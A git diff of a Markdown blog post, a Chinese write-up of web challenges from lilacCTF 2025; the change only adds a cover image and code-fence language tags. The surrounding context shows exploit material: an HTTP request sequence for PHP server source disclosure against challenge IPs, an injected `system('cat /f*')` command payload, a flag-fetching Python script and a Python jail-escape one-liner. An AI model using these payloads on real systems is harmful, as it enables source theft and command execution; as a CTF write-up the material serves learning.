@@ -4,12 +4,12 @@ description: "lilacCTF 2025 Web方向比赛WP，整理解题思路、关键利�
 pubDate: "2026-03-01"
 updatedDate: "2026-03-01"
 tags: ["CTF", "Web安全", "WP"]
-cover: auto
+cover: "f037b44c681c4828bf8eefeccffedee9e131003f.jpg"
 coverAlt: "lilacCTF2025 Web 解出汇总 的文章封面"
 draft: false
 ---
 ## Path
-```
+```python
 import requests
 
 def fetch_info(URL):
@@ -58,7 +58,7 @@ if __name__ == "__main__":
     fetch_file(URL_EXPORT, token, FLAG_PATH2)
 ```
 ## keep
-```
+```http
 GET /index.php HTTP/1.1
 Host: 61.147.171.105:52689
 /r/n
@@ -67,7 +67,7 @@ GET /xyz.xyz HTTP/1.1
 /r/n
 ```
 https://projectdiscovery.io/blog/php-http-server-source-disclosure#proof-of-concept
-```
+```http
 GET /s3Cr37_f1L3.php.bak HTTP/1.1
 Host: 61.147.171.103:49586
 
@@ -79,6 +79,6 @@ admin=system('cat /f*');
 
 ```
 ## check in
-```
+```python
 vars().get(min(dir())).append(~vars().get(min(dir())).pop())
 ```
